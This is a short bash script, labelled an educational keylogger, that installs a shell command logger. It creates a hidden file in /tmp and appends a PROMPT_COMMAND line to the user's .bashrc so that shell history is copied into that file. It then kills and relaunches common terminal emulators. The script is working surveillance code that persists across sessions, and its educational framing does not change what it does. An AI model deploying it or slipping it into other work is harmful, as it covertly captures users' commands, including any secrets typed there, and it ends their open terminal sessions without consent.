#!/bin/bash

# Simulated Command Logger (Educational Keylogger)
# Logs user shell commands and restarts terminal

LOG_FILE="/tmp/.commandlog"
BASHRC="$HOME/.bashrc"
LOGGER_LINE='export PROMPT_COMMAND='\''history -a >(tee -a /tmp/.commandlog)'\'''

echo "[*] Installing simulated keylogger..."

# Step 1: Create hidden log file
touch "$LOG_FILE"
chmod 600 "$LOG_FILE"

# Step 2: Add logger to .bashrc if not already present
if ! grep -Fxq "$LOGGER_LINE" "$BASHRC"; then
  echo "$LOGGER_LINE" >> "$BASHRC"
  echo "[*] Logger added to .bashrc"
else
  echo "[*] Logger already exists in .bashrc"
fi

# Step 3: Restart terminal (for most terminal emulators)
TERMINAL_APP=$(ps -o comm= -p $(pgrep -n -u "$USER" bash))

echo "[*] Restarting terminal..."

# Try closing and reopening the terminal
sleep 1

# Detect and relaunch common terminals
if pgrep -x gnome-terminal > /dev/null; then
  pkill -f gnome-terminal
  nohup gnome-terminal & disown
elif pgrep -x xfce4-terminal > /dev/null; then
  pkill -f xfce4-terminal
  nohup xfce4-terminal & disown
elif pgrep -x konsole > /dev/null; then
  pkill -f konsole
  nohup konsole & disown
else
  echo "[!] Could not auto-restart terminal. Please reopen it manually."
fi

echo "[*] Done. Commands will now be logged to $LOG_FILE"
